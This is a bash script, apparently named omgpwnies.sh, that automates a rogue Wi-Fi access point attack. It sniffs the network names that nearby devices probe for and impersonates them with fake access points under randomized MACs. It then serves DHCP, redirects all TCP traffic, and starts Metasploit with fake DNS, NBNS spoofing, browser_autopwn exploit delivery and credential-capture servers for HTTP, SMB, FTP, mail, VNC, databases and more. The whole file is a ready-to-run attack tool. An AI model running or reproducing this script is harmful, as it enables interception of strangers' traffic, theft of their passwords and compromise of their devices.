#!/bin/bash

#change http capture default page, can include ntlm capture etc, figure out how to serve specific pages, test all ssl
#use auxiliary/server/capture/http_ntlm

function msfconsole_setup {

  echo "use auxiliary/server/fakedns" > newkarma.rc
  echo "set targetdomain fake" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/browser_autopwn" >> newkarma.rc
  echo "set lhost 192.168.1.1" >> newkarma.rc
  echo "set srvport 1234" >> newkarma.rc
  echo "set uripath /ads" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/http" >> newkarma.rc
  echo "set autopwn_host 192.168.1.1" >> newkarma.rc
  echo "set autopwn_port 1234" >> newkarma.rc
  echo "set autopwn_uri /ads" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/http" >> newkarma.rc
  echo "set autopwn_host 192.168.1.1" >> newkarma.rc
  echo "set autopwn_port 1234" >> newkarma.rc
  echo "set autopwn_uri /ads" >> newkarma.rc
  echo "set srvport 443" >> newkarma.rc
  echo "set ssl true" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/ftp" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/imap" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/pop3" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/spoof/nbns/nbns_response" >> newkarma.rc
  echo "set spoofip 192.168.1.1" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/smb" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/smtp " >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/telnet" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/vnc" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/mssql" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/mysql" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/printjob_capture" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/sip" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/postgresql" >> newkarma.rc
  echo "run" >> newkarma.rc

  echo "use auxiliary/server/capture/drda" >> newkarma.rc
  echo "run" >> newkarma.rc

  guake -n 1 -r "Metasploit" -e "msfconsole -r newkarma.rc; exit" &>/dev/null
}

function dhcpd_start {

  mv /etc/dhcp3/dhcpd.conf dhcpd.conf.bak
  touch /etc/dhcp3/dhcpd.conf

  curnetwork=0
  ls -al .*.pwnies | grep -o -E "\..+" | while read curap; do
    ((++curnetwork))
    curiface=`grep -o -E "at[0-9]+" "$curap" | tail -n 1`
    apname=`echo "$curap" | cut -d "." -f 2 | tr -d ' '`
  
    ifconfig $curiface 192.168.$curnetwork.1 up

    echo "subnet 192.168.$curnetwork.0 netmask 255.255.255.0 {" >> /etc/dhcp3/dhcpd.conf
    echo "  range 192.168.$curnetwork.2 192.168.$curnetwork.254;" >> /etc/dhcp3/dhcpd.conf
    echo "  option domain-name-servers 192.168.$curnetwork.1;" >> /etc/dhcp3/dhcpd.conf
    echo "  option netbios-name-servers 192.168.$curnetwork.1;" >> /etc/dhcp3/dhcpd.conf
    echo "  option domain-name \"$apname.org\";" >> /etc/dhcp3/dhcpd.conf
    echo "  option routers 192.168.$curnetwork.1;" >> /etc/dhcp3/dhcpd.conf
    echo "}" >> /etc/dhcp3/dhcpd.conf
  done

  /etc/init.d/dhcp3-server start &>/dev/null
  guake -n 1 -r "dhcp3-server" -e "tail -n 0 -f /var/log/syslog | grep dhcpd; exit" &>/dev/null
}

function dhcpd_stop {
  killall tail &>/dev/null
  rm .*.pwnies &>/dev/null
  service dhcp3-server stop &>/dev/null
  mv dhcpd.conf.bak /etc/dhcp3/dhcpd.conf &>/dev/null
}

if [ -z "$1" ]; then
  echo "./omgpwnies.sh (wlan iface)"
  exit
fi

if [ ! -e "/usr/sbin/dhcpd3" ]; then
  echo "DHCPD not installed"
  exit
fi

if [ ! -e "/usr/bin/guake" ]; then
  echo "guake not installed"
  exit
fi

function apps_create {
  echo $1 | grep -o -E "[^,]+" | while read curessid; do
    newiface=`airmon_start $2`
    ifconfig $newiface down &>/dev/null
    macchanger -r $newiface &>/dev/null
    ifconfig $newiface up &>/dev/null
    guake -n 1 -r "$curessid" -e "airbase-ng -I 100 -y -v -c 6 --essid \"$curessid\" $newiface | tee \".$curessid.pwnies\"; exit" &>/dev/null
    echo -n "$newiface,"
  done
}

function apps_destroy {
  killall airbase-ng &>/dev/null
  echo $1 | grep -o -E "[^,]+" | while read curiface; do
    airmon-ng stop $curiface &>/dev/null
  done
}

function airmon_start {
  airmon-ng start $1 | grep "monitor mode enabled on" | grep -o -E "mon[0-9]+" | tail -n 1
}

function airmon_stop {
  airmon-ng stop $1 &>/dev/null
}

function site_survey {
  airodump-ng -f 1000 --output-format csv -w pwniessurvey $1 &> /dev/null &
  sleep 14 &> /dev/null
  killall airodump-ng &> /dev/null
  grep -B 100 "^Station MAC" pwniessurvey-01.csv | grep -E "(..:){5}.." | cut -d "," -f 14 | grep -o -E "[^ ].+" | while read curline; do
    echo -n "$curline,"
  done
  rm pwniessurvey-01.csv &> /dev/null
}

echo "Starting monitor interface"
moniface=`airmon_start $1`
echo "Performing site survey"
essidlist=`site_survey $moniface`
echo "Starting airodump-ng"
guake -n 1 -r "airodump-ng" -e "airodump-ng -c 6 $moniface; exit"
echo "Creating fake access points: " $essidlist
appsiface=`apps_create "$essidlist" $1`
echo "Creating generic access point: Internet"
guake -n 1 -r "Internet" -e "airbase-ng -I 100 -P -v -c 6 --essid \"Internet\" $moniface | tee \".Internet.pwnies\"; exit" &>/dev/null
sleep 1
echo "Setting up DHCP"
dhcpd_start
echo "Staring Metasploit, quit to exit"
iptables -t nat -I PREROUTING -p tcp -j REDIRECT
msfconsole_setup
while true; do
  sleep 1
  if [ -z "`pidof .ruby.bin`" ]; then
    break
  fi
done
iptables -t nat -F
rm newkarma.rc
echo "Stopping DHCP"
dhcpd_stop
echo "Killing access points"
apps_destroy $appsiface
echo "Stopping monitor interface"
killall airodump-ng
airmon_stop $moniface

